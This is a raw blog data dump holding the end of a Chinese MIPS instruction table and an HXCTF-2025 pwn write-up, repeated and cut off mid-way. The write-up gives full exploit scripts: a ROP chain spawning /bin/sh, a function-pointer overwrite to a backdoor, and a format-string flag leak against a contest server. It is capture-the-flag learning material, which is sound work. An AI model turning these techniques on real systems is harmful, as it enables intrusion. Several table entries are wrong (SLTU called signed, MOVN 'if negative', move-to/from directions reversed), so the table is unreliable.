F1,F2,F3</td>\n</tr>\n<tr>\n<td>MUL.D</td>\n<td>一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td>\n<td>DMUL.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>MUL.PS</td>\n<td>两个单精度浮点数相乘，结果为单精度浮点数</td>\n<td>DMUL.PS F1,F2,F3</td>\n</tr>\n<tr>\n<td>AND</td>\n<td>与运算，两个寄存器中的内容相与</td>\n<td>ANDＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>ANDI</td>\n<td>一个寄存器中的内容与一个立即数相与</td>\n<td>ANDIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>OR</td>\n<td>或运算，两个寄存器中的内容相或</td>\n<td>ORＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>ORI</td>\n<td>一个寄存器中的内容与一个立即数相或</td>\n<td>ORIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>XOR</td>\n<td>异或运算，两个寄存器中的内容相异或</td>\n<td>XORＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>XORI</td>\n<td>一个寄存器中的内容与一个立即数异或</td>\n<td>XORIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>BEQZ</td>\n<td>条件转移指令，当寄存器中内容为0时转移发生</td>\n<td>BEQZ R1,0</td>\n</tr>\n<tr>\n<td>BENZ</td>\n<td>条件转移指令，当寄存器中内容不为0时转移发生</td>\n<td>BNEZ R1,0</td>\n</tr>\n<tr>\n<td>BEQ</td>\n<td>条件转移指令，当两个寄存器内容相等时转移发生</td>\n<td>BEQ R1,R2</td>\n</tr>\n<tr>\n<td>BNE</td>\n<td>条件转移指令，当两个寄存器中内容不等时转移发生</td>\n<td>BNE R1,R2</td>\n</tr>\n<tr>\n<td>J</td>\n<td>直接跳转指令，跳转的地址在指令中</td>\n<td>J name</td>\n</tr>\n<tr>\n<td>JR</td>\n<td>使用寄存器的跳转指令，跳转地址在寄存器中</td>\n<td>JR R1</td>\n</tr>\n<tr>\n<td>JAL</td>\n<td>直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中</td>\n<td>JAL R1 name</td>\n</tr>\n<tr>\n<td>JALR</td>\n<td>使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中</td>\n<td>JALR R1</td>\n</tr>\n<tr>\n<td>MOV.S</td>\n<td>把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>\n<td>MOV.S F0,F1</td>\n</tr>\n<tr>\n<td>MOV.D</td>\n<td>把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>\n<td>MOV.D F0,F1</td>\n</tr>\n<tr>\n<td>MFC0</td>\n<td>把一个数据从通用寄存器复制到特殊寄存器</td>\n<td>MFC0 R1,R2</td>\n</tr>\n<tr>\n<td>MTC0</td>\n<td>把一个数据从特殊寄存器复制到通用寄存器</td>\n<td>MTC0 R1,R2</td>\n</tr>\n<tr>\n<td>MFC1</td>\n<td>把一个数据从定点寄存器复制到浮点寄存器</td>\n<td>MFC1 R1,F1</td>\n</tr>\n<tr>\n<td>MTC1</td>\n<td>把一个数据从浮点寄存器复制到定点寄存器</td>\n<td>MTC1 R1,F1</td>\n</tr>\n<tr>\n<td>LUI</td>\n<td>把一个16位的立即数填入到寄存器的高16位，低16位补零</td>\n<td>LUI R1,#42</td>\n</tr>\n<tr>\n<td>DSLL</td>\n<td>双字逻辑左移</td>\n<td>DSLL R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRL</td>\n<td>双字逻辑右移</td>\n<td>DSRL R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRA</td>\n<td>双字算术右移</td>\n<td>DSRA R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSLLV</td>\n<td>可变的双字逻辑左移</td>\n<td>DSLLV R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRLV</td>\n<td>可变的双字罗伊右移</td>\n<td>DSRLV R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRAV</td>\n<td>可变的双字算术右移</td>\n<td>DSRAV R1,R2,#2</td>\n</tr>\n<tr>\n<td>SLT</td>\n<td>如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td>\n<td>SLT R1,R2,R3</td>\n</tr>\n<tr>\n<td>SLTI</td>\n<td>如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td>\n<td>SLTI R1,R2,#23</td>\n</tr>\n<tr>\n<td>SLTU</td>\n<td>功能与SLT一致，但是带符号的</td>\n<td>SLTU R1,R2,R3</td>\n</tr>\n<tr>\n<td>SLTUI</td>\n<td>功能与SLT一致，但不带符号</td>\n<td>SLTUI R1,R2,R3</td>\n</tr>\n<tr>\n<td>MOVN</td>\n<td>如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td>\n<td>MOVN R1,R2,R3</td>\n</tr>\n<tr>\n<td>MOVZ</td>\n<td>如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td>\n<td>MOVZ R1,R2,R3</td>\n</tr>\n<tr>\n<td>TRAP</td>\n<td>根据地址向量转入管态</td>\n<td></td>\n</tr>\n<tr>\n<td>ERET</td>\n<td>从异常中返回到用户态</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.S</td>\n<td>一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.D</td>\n<td>一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.PS</td>\n<td>两个单精度浮点数相乘加，结果为单精度</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h3><p><a href=\"https://syscalls.w3challs.com/\">syscall</a></p>\n"},{"title":"HXCTF-2025-pwn","cover":"/img/治不开心药.png","_content":"# final\n## alongrop\n### ida分析\n![image-20250524195608074](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524195608074.png)\n1.打开第一眼，左边函数特多，加载特慢。静态编译的文件\n2.如图框出部分，提示ROPchain。同时0x256字节的输入，显然是ROP。\n3.最后，标记出偏移是0x40+0x8\n\n### gdb & ROPgadget 分析\n`ROPgadget --binary alongrop --ropchain`\n**使用命令查看一下ropchain**\n\n```python\n- Step 5 -- Build the ROP chain\n\n#!/usr/bin/env python3\n# execve generated by ROPgadget\n\nfrom struct import pack\n\n# Padding goes here\np = b''\n\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c0) # @ .data\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x00000000004211eb) # pop rax ; ret\np += b'/bin//sh'\np += pack('<Q', 0x00000000004205c5) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x000000000044cf30) # xor rax, rax ; ret\np += pack('<Q', 0x00000000004205c5) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x0000000000402148) # pop rdi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c0) # @ .data\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x000000000040190d) # pop rdx ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\np += pack('<Q', 0x000000000044cf30) # xor rax, rax ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x00000000004012d3) # syscall\n```\n1.有可以直接写的ROPchain，但是应该不行，因为太长了。我们可以搜寻一下pop_rax;ret,直接将rax设置为0x3b，这样可以减少很多字节。\n2.然后不要忘记输入ROPchain前有0x40+0x8的垃圾数据要填充。\n\n### exp\n```python\nfrom pwn import *\nfrom struct import pack\n\nmode=1\nurl='43.139.51.42'\nport=38369\nif mode==0 :\n\tio=process(\"./alongrop\")\nelse:\n\tio=remote(url,port)\n#gadgets\npop_rax=0x00000000004211eb\npop_rbx=0x000000000040190d\npop_rsi_rbp=0x0000000000404ed2\npop_rdi_rbp=0x0000000000402148\n# \noffset=0x40+0x8\npayload=offset*b\"a\"\npayload+=p64(0x0000000000404ed2)\npayload+=p64(0x00000000004aa0c0)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x00000000004211eb)\npayload+=b'/bin//sh'\npayload+=p64(0x00000000004205c5)\npayload+=p64(0x0000000000404ed2)\npayload+=p64(0x00000000004aa0c8)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x000000000044cf30)\npayload+=p64(0x00000000004205c5)\npayload+=p64(0x0000000000402148)\npayload+=p64(0x00000000004aa0c0)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x0000000000404ed2) # pop rsi ; pop rbp ; ret\npayload+=p64(0x00000000004aa0c8) # @ .data + 8\npayload+=p64(0x4141414141414141) # padding\npayload+=p64(0x000000000040190d) # pop rdx ; ret\npayload+=p64(0x00000000004aa0c8) # @ .data + 8\npayload+=p64(0x00000000004211eb)\npayload+=p64(59)\npayload+=p64(0x00000000004012d3)\n\n#gdb.attach(io)\nio.send(payload)\n## \nio.interactive()\n```\n## secret \n### ida分析\n**先进行了一下小小的逆向，把一些变量和函数名字改了一下**\n#### main函数分析\n![](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524200824362.png)\n1.第一眼看到输入赋值给v3,但v3是数组。v3[0]是我们的选项\n2.关于后续功能的实现有猫腻，`funcs[v3[0]-1]()`.稍微有点经验就能看出来，这是在调用funcs[]中的函数，那么funcs中到底有什么呢？跟进去看看。\n#### funcs数组分析\n![image-20250524201339633](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201339633.png)\n1.对ida熟悉一点，就知道这里存放的是函数的地址，分别就是menu中三个选项对应的函数。\n2.所以假设前面的v3=1，那么就会执行funcs[0],也就是加密。\n3.理清了程序执行功能的逻辑，再来看每个功能。这题最关键的事encrypt，我在这里就自分析这个。\n#### encrypt分析\n![image-20250524201727975](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201727975.png)\n1.首先会往abcd这里读入0x50字节的数据。\n2.然后会对这些数据作加密处理，而加密的方式是与某个数组中的一个数，按位异或。\n3.知道按位异或的作用，a^b=c ==> a=b^c,因此，加密的结果再加密，就是原值。\n4.用来加密的数组就是funcs图中的s1yner\n5.abcd同样位于data段，并且里funcs很近。\n#### 思路分析\n1.第一个想法是通过Encrypt中的溢出，覆盖掉funcs的函数，为backdoor(题目留的后门函数，可以cat flag)。但是只有0x50字节，不够，只能刚好写满abcd那个数组。这里意识到，我们只能把后门写在abcd这个数组上。所以应该考虑有没有办法，访问到这里呢？\n2.继续回去观察main函数，看到输入后会检测v3是否大于3。也就是小于等于3，都是合法的输入。试想，如果输入0，那么最后就是`func[-1]()`,也就是会调用我们最后输入的8字节的地址。因此，我们可以输入0 和 负数，来访问abcd上的地址。只要对应上。\n3.那接下来就是解决，加密的问题。很简单，将log_level设置为debug，发送正常的backdoor地址，看看返回的加密内容是什么。然后手敲一下backdoor的地址，把加密后的内容作为原文发送，那么正确的地址就会在加密后被写上去。\n\n### gdb分析\n#### 加密内容获取\n![image-20250524203433694](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524203433694.png)\n1.直接发送p64(backdoor)，查看加密的内容。\n2.从后往前数，因为后面紧跟的是`1.Encrupt......`，从0x31 往前数8个字节，就是我们要的内容，然后直接发这个就行。\n\n### exp\n```python\nfrom pwn import *\ncontext.log_level='debug'\nmode=0\nurl='43.139.51.42'\nport=38403\nif mode==0 :\n\tio=process(\"./secret\")\nelse:\n\tio=remote(url,port)\n\t\nbackdoor=0x4014a7\noffset=0x40\n\nkey=[\"s\",\"1\",\"n\",\"y\",\"e\",\"r\"]\n#\npayload=offset*b'a'\n#payload+=p64(backdoor)\npayload+=b'\\xc2\\x66\\x33\\x31\\x6e\\x79\\x65\\x72'\ngdb.attach(io)\nio.sendlineafter(\">>\",\"1\")\nio.send(payload)\n\nio.interactive()\n```\n## flagreader\n### ida分析\n#### main函数分析\n![image-20250524204127748](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204127748.png)\n1.开幕雷击，直接就是一个gift给我们。显然是一个地址，可能需要这个地址泄露一些东西。\n2.同时还有两个函数，一个readflag，一个vuln。直接跟进。\n#### readflag函数分析\n![image-20250524204334952](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204334952.png)\n![image-20250524204424654](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204424654.png)\n1.首先看伪代码，发现是把flag读取了0x50字节，写在了`&_bss_start[6]._IO_read_end`上。但是这个，到底是哪个地址呢？\n2.观察汇编的代码，可以看到rsi也就读入的地址是rcx，而rcx 又是 rax+0x520，rax又是__bss_start.所以可以知道rsi=__bss_start+0x520.\n3.而我们的gift就是__bss_start.\n#### vuln函数分析\n![image-20250524204837954](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204837954.png)\n1.非常明显的格式化字符串漏洞，结合上文。第一个想到把flag的地址写入，同时用\"%s\"对flag内容进行打印。\n2.64位要加上6，因为有前6个寄存器。最后的偏移还是需要gdb查看。因为可以输入0x10，所以可以把__bss_start+0x520布置在下面。\n\n### gdb分析\n\n![image-20250524205449833](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524205449833.png)\n1.找到printf函数的栈帧，可以看到我们的输入是在偏移为0 的位置，加上6就是6.\n2.把地址写在下面的话，偏移就是7。\n\n### exp\n```python\nfrom pwn import *\ncontext.log_level='debug'\nmode=1\nurl='43.139.51.42'\nport=38430\nif mode==0 :\n\tio=process(\"./flagreader\")\nelse:\n\tio=remote(url,port)\n#gdb.attach(io)\nio.recvuntil(\"Here is your gift: \")\nbss_start=int(io.recv(14),16)\nlog.success(\"bss-{}\".format(hex(bss_start)))\nflag=bss_start+1312\npayload=b'%7$s'.ljust(8,b'\\x41')\npayload+=p64(flag)\n\nio.send(payload)\n\nio.interactive()\n```","source":"_posts/ctf比赛复现/HXCTF决赛/writeup.md","raw":"---\ntitle: HXCTF-2025-pwn\ntags:\n    - 新生赛\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# final\n## alongrop\n### ida分析\n![image-20250524195608074](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524195608074.png)\n1.打开第一眼，左边函数特多，加载特慢。静态编译的文件\n2.如图框出部分，提示ROPchain。同时0x256字节的输入，显然是ROP。\n3.最后，标记出偏移是0x40+0x8\n\n### gdb & ROPgadget 分析\n`ROPgadget --binary alongrop --ropchain`\n**使用命令查看一下ropchain**\n\n```python\n- Step 5 -- Build the ROP chain\n\n#!/usr/bin/env python3\n# execve generated by ROPgadget\n\nfrom struct import pack\n\n# Padding goes here\np = b''\n\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c0) # @ .data\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x00000000004211eb) # pop rax ; ret\np += b'/bin//sh'\np += pack('<Q', 0x00000000004205c5) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x000000000044cf30) # xor rax, rax ; ret\np += pack('<Q', 0x00000000004205c5) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x0000000000402148) # pop rdi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c0) # @ .data\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x0000000000404ed2) # pop rsi ; pop rbp ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\n\tp += pack('<Q', 0x4141414141414141) # padding\np += pack('<Q', 0x000000000040190d) # pop rdx ; ret\np += pack('<Q', 0x00000000004aa0c8) # @ .data + 8\np += pack('<Q', 0x000000000044cf30) # xor rax, rax ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x000000000046a060) # add rax, 1 ; ret\np += pack('<Q', 0x00000000004012d3) # syscall\n```\n1.有可以直接写的ROPchain，但是应该不行，因为太长了。我们可以搜寻一下pop_rax;ret,直接将rax设置为0x3b，这样可以减少很多字节。\n2.然后不要忘记输入ROPchain前有0x40+0x8的垃圾数据要填充。\n\n### exp\n```python\nfrom pwn import *\nfrom struct import pack\n\nmode=1\nurl='43.139.51.42'\nport=38369\nif mode==0 :\n\tio=process(\"./alongrop\")\nelse:\n\tio=remote(url,port)\n#gadgets\npop_rax=0x00000000004211eb\npop_rbx=0x000000000040190d\npop_rsi_rbp=0x0000000000404ed2\npop_rdi_rbp=0x0000000000402148\n# \noffset=0x40+0x8\npayload=offset*b\"a\"\npayload+=p64(0x0000000000404ed2)\npayload+=p64(0x00000000004aa0c0)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x00000000004211eb)\npayload+=b'/bin//sh'\npayload+=p64(0x00000000004205c5)\npayload+=p64(0x0000000000404ed2)\npayload+=p64(0x00000000004aa0c8)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x000000000044cf30)\npayload+=p64(0x00000000004205c5)\npayload+=p64(0x0000000000402148)\npayload+=p64(0x00000000004aa0c0)\npayload+=p64(0x4141414141414141)\npayload+=p64(0x0000000000404ed2) # pop rsi ; pop rbp ; ret\npayload+=p64(0x00000000004aa0c8) # @ .data + 8\npayload+=p64(0x4141414141414141) # padding\npayload+=p64(0x000000000040190d) # pop rdx ; ret\npayload+=p64(0x00000000004aa0c8) # @ .data + 8\npayload+=p64(0x00000000004211eb)\npayload+=p64(59)\npayload+=p64(0x00000000004012d3)\n\n#gdb.attach(io)\nio.send(payload)\n## \nio.interactive()\n```\n## secret \n### ida分析\n**先进行了一下小小的逆向，把一些变量和函数名字改了一下**\n#### main函数分析\n![](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524200824362.png)\n1.第一眼看到输入赋值给v3,但v3是数组。v3[0]是我们的选项\n2.关于后续功能的实现有猫腻，`funcs[v3[0]-1]()`.稍微有点经验就能看出来，这是在调用funcs[]中的函数，那么funcs中到底有什么呢？跟进去看看。\n#### funcs数组分析\n![image-20250524201339633](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201339633.png)\n1.对ida熟悉一点，就知道这里存放的是函数的地址，分别就是menu中三个选项对应的函数。\n2.所以假设前面的v3=1，那么就会执行funcs[0],也就是加密。\n3.理清了程序执行功能的逻辑，再来看每个功能。这题最关键的事encrypt，我在这里就自分析这个。\n#### encrypt分析\n![image-20250524201727975](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201727975.png)\n1.首先会往abcd这里读入0x50字节的数据。\n2.然后会对这些数据作加密处理，而加密的方式是与某个数组中的一个数，按位异或。\n3.知道按位异或的作用，a^b=c ==> a=b^c,因此，加密的结果再加密，就是原值。\n4.用来加密的数组就是funcs图中的s1yner\n5.abcd同样位于data段，并且里funcs很近。\n#### 思路分析\n1.第一个想法是通过Encrypt中的溢出，覆盖掉funcs的函数，为backdoor(题目留的后门函数，可以cat flag)。但是只有0x50字节，不够，只能刚好写满abcd那个数组。这里意识到，我们只能把后门写在abcd这个数组上。所以应该考虑有没有办法，访问到这里呢？\n2.继续回去观察main函数，看到输入后会检测v3是否大于3。也就是小于等于3，都是合法的输入。试想，如果输入0，那么最后就是`func[-1]()`,也就是会调用我们最后输入的8字节的地址。因此，我们可以输入0 和 负数，来访问abcd上的地址。只要对应上。\n3.那接下来就是解决，加密的问题。很简单，将log_level设置为debug，发送正常的backdoor地址，看看返回的加密内容是什么。然后手敲一下backdoor的地址，把加密后的内容作为原文发送，那么正确的地址就会在加密后被写上去。\n\n### gdb分析\n#### 加密内容获取\n![image-20250524203433694](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524203433694.png)\n1.直接发送p64(backdoor)，查看加密的内容。\n2.从后往前数，因为后面紧跟的是`1.Encrupt......`，从0x31 往前数8个字节，就是我们要的内容，然后直接发这个就行。\n\n### exp\n```python\nfrom pwn import *\ncontext.log_level='debug'\nmode=0\nurl='43.139.51.42'\nport=38403\nif mode==0 :\n\tio=process(\"./secret\")\nelse:\n\tio=remote(url,port)\n\t\nbackdoor=0x4014a7\noffset=0x40\n\nkey=[\"s\",\"1\",\"n\",\"y\",\"e\",\"r\"]\n#\npayload=offset*b'a'\n#payload+=p64(backdoor)\npayload+=b'\\xc2\\x66\\x33\\x31\\x6e\\x79\\x65\\x72'\ngdb.attach(io)\nio.sendlineafter(\">>\",\"1\")\nio.send(payload)\n\nio.interactive()\n```\n## flagreader\n### ida分析\n#### main函数分析\n![image-20250524204127748](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204127748.png)\n1.开幕雷击，直接就是一个gift给我们。显然是一个地址，可能需要这个地址泄露一些东西。\n2.同时还有两个函数，一个readflag，一个vuln。直接跟进。\n#### readflag函数分析\n![image-20250524204334952](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204334952.png)\n![image-20250524204424654](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204424654.png)\n1.首先看伪代码，发现是把flag读取了0x50字节，写在了`&_bss_start[6]._IO_read_end`上。但是这个，到底是哪个地址呢？\n2.观察汇编的代码，可以看到rsi也就读入的地址是rcx，而rcx 又是 rax+0x520，rax又是__bss_start.所以可以知道rsi=__bss_start+0x520.\n3.而我们的gift就是__bss_start.\n#### 